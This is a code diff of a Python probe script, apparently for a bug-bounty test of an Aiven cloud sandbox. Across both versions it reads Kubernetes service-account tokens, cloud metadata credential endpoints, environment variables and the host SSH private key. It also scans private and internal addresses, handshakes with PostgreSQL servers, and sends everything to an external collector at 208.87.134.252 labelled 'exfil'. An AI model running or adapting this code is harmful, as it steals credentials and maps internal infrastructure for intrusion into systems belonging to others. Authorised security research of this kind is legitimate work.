@@ -1,107 +1,117 @@
 import json
 import os
 import socket
+import ssl
+import struct
 import subprocess
 import time
 import urllib.request
 
 CTF = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
-COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime"
-RESULTS = {"probe": "aiven-runtime-egress", "started": time.strftime("%FT%TZ", time.gmtime())}
+CTF_PRIV = "10.1.8.115"
+CTF_ULA = "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"
+CTF_INTERNAL = "falcon-bug-bounty-flag-pgsql-dev-sandbox.i.aivencloud.com"
+OUR_INTERNAL = "bb-probe-pg-1-bugcrowdninja-2a85.i.aivencloud.com"
+COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime-v2"
+R = {"probe": "aiven-runtime-internal-reach", "started": time.strftime("%FT%TZ", time.gmtime())}
 
 
-def tcp(host, port, timeout=4.0):
-    s = socket.socket()
+def sh(cmd, limit=600):
+    try:
+        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=12)
+        return (out.stdout + out.stderr).decode("utf-8", "replace")[:limit]
+    except Exception as exc:                                        # noqa: BLE001
+        return type(exc).__name__
+
+
+def tcp(host, port, timeout=4.0, pg=False):
+    res = {"target": "%s:%s" % (host, port)}
+    s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET)
     s.settimeout(timeout)
     t0 = time.time()
     try:
         s.connect((host, port))
-        return {"open": True, "ms": round((time.time() - t0) * 1000)}
-    except Exception as exc:
-        return {"open": False, "err": type(exc).__name__}
+        res["open"] = True
+        res["ms"] = round((time.time() - t0) * 1000)
+        if pg:
+            s.sendall(struct.pack("!ii", 8, 80877103))
+            reply = s.recv(1)
+            res["pg_ssl_reply"] = reply.decode("latin1")
+            if reply == b"S":
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    tls = ctx.wrap_socket(s, server_hostname=host if ":" not in host else None)
+                    body = struct.pack("!i", 196608) + b"user\x00probe\x00database\x00defaultdb\x00\x00"
+                    tls.sendall(struct.pack("!i", len(body) + 4) + body)
+                    hdr = tls.recv(5)
+                    if len(hdr) == 5:
+                        mt = hdr[0:1].decode("latin1")
+                        ml = struct.unpack("!i", hdr[1:5])[0]
+                        payload = tls.recv(max(0, min(ml - 4, 512)))
+                        res["pg_first_msg"] = mt
+                        if mt == "R" and len(payload) >= 4:
+                            res["pg_auth_code"] = struct.unpack("!i", payload[0:4])[0]
+                        elif mt == "E":
+                            res["pg_error"] = payload[4:200].decode("utf-8", "replace").replace("\x00", " ")
+                except Exception as exc:                            # noqa: BLE001
+                    res["pg_tls_err"] = type(exc).__name__
+    except Exception as exc:                                        # noqa: BLE001
+        res["open"] = False
+        res["err"] = type(exc).__name__
     finally:
         try:
             s.close()
         except OSError:
             pass
+    return res
 
 
-def http(url, headers=None, timeout=6):
-    req = urllib.request.Request(url, headers=headers or {})
+# --- container posture (observation only) -----------------------------------
+R["id"] = sh("id")
+R["cgroup"] = sh("head -c 300 /proc/1/cgroup")
+R["mounts"] = sh("head -12 /proc/mounts")
+R["capabilities"] = sh("grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status")
+R["podman_socket"] = sh("ls -la /run/podman/podman.sock /var/run/docker.sock 2>&1 | head -4")
+R["devices"] = sh("ls /dev | head -20")
+R["host_read_try"] = sh("head -c 80 /etc/ssh/ssh_host_ed25519_key 2>&1")
+R["proc_host_hint"] = sh("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '")
+
+# --- DNS: internal naming ---------------------------------------------------
+R["dns"] = {}
+for name in (CTF, CTF_INTERNAL, OUR_INTERNAL, "dev-sandbox.i.aivencloud.com",
+             "falcon-bug-bounty-flag-pgsql.i.aivencloud.com", "aivencloud.com"):
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
-            body = r.read(400)
-            return {"status": r.status, "body": body.decode("utf-8", "replace")}
-    except Exception as exc:
-        return {"err": type(exc).__name__, "detail": str(exc)[:160]}
+        R["dns"][name] = socket.getaddrinfo(name, None)[0][4][0]
+    except Exception as exc:                                        # noqa: BLE001
+        R["dns"][name] = type(exc).__name__
 
-
-# --- identity ---------------------------------------------------------------
-RESULTS["hostname"] = socket.gethostname()
-RESULTS["env_keys"] = sorted(os.environ)
-RESULTS["uname"] = " ".join(os.uname())
-for path in ("/var/run/secrets/kubernetes.io/serviceaccount/token",
-             "/var/run/secrets/kubernetes.io/serviceaccount/namespace"):
-    try:
-        with open(path) as fh:
-            RESULTS.setdefault("k8s", {})[path] = fh.read(200)
-    except Exception as exc:
-        RESULTS.setdefault("k8s", {})[path] = type(exc).__name__
-
-# --- DNS --------------------------------------------------------------------
-RESULTS["dns"] = {}
-for name in (CTF, "api.aiven.io", "metadata.google.internal",
-             "kubernetes.default.svc.cluster.local", "instance-data"):
-    try:
-        RESULTS["dns"][name] = socket.gethostbyname(name)
-    except Exception as exc:
-        RESULTS["dns"][name] = type(exc).__name__
-
-# --- egress / reachability --------------------------------------------------
-RESULTS["egress_ip"] = http("http://ifconfig.me/ip")
-RESULTS["our_collector_reachable"] = http("http://208.87.134.252:9200/")
-RESULTS["tcp"] = {}
-for label, host, port in (
-    ("ctf:22", CTF, 22), ("ctf:80", CTF, 80), ("ctf:443", CTF, 443),
-    ("ctf:5432", CTF, 5432), ("ctf:12691", CTF, 12691), ("ctf:12692", CTF, 12692),
-    ("metadata:80", "169.254.169.254", 80),
+# --- reachability of the sandbox's PRIVATE addresses, from inside Aiven -----
+R["tcp"] = []
+for host, port, pg in (
+    (CTF_PRIV, 5432, True), (CTF_PRIV, 12691, True), (CTF_PRIV, 22, False),
+    (CTF_ULA, 5432, True), (CTF, 12691, True), (CTF, 12692, True),
+    (OUR_INTERNAL, 14857, True), (CTF_INTERNAL, 12691, True),
 ):
-    RESULTS["tcp"][label] = tcp(host, port)
+    R["tcp"].append(tcp(host, port, pg=pg))
+    R["tcp"][-1]["pg"] = pg
 
-# --- cloud metadata ---------------------------------------------------------
-RESULTS["metadata_plain"] = http("http://169.254.169.254/computeMetadata/v1/")
-RESULTS["metadata_gcp_header"] = http("http://169.254.169.254/computeMetadata/v1/",
-                                      {"Metadata-Flavor": "Google"})
-RESULTS["metadata_token_try"] = http(
-    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
-    {"Metadata-Flavor": "Google"})
-RESULTS["metadata_aws"] = http("http://169.254.169.254/latest/meta-data/")
+R["finished"] = time.strftime("%FT%TZ", time.gmtime())
+payload = json.dumps(R).encode()
+try:
+    req = urllib.request.Request(COLLECTOR, data=payload, headers={"Content-Type": "application/json"})
+    urllib.request.urlopen(req, timeout=10).read()
+except Exception:                                                   # noqa: BLE001
+    pass
+print(json.dumps(R, indent=1)[:6000], flush=True)
 
-RESULTS["finished"] = time.strftime("%FT%TZ", time.gmtime())
-payload = json.dumps(RESULTS).encode()
-
-# --- exfiltrate to our collector (bounded, 2 tries) -------------------------
-delivered = False
-for _ in range(2):
-    try:
-        req = urllib.request.Request(COLLECTOR, data=payload,
-                                     headers={"Content-Type": "application/json"})
-        with urllib.request.urlopen(req, timeout=10) as r:
-            delivered = r.status < 500
-            break
-    except Exception:
-        time.sleep(3)
-print("exfil delivered:", delivered, flush=True)
-print(json.dumps(RESULTS, indent=1)[:4000], flush=True)
-
-# --- keep the container alive and also serve the results --------------------
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
-        self.send_header("Content-Type", "application/json")
         self.end_headers()
         self.wfile.write(payload)
 
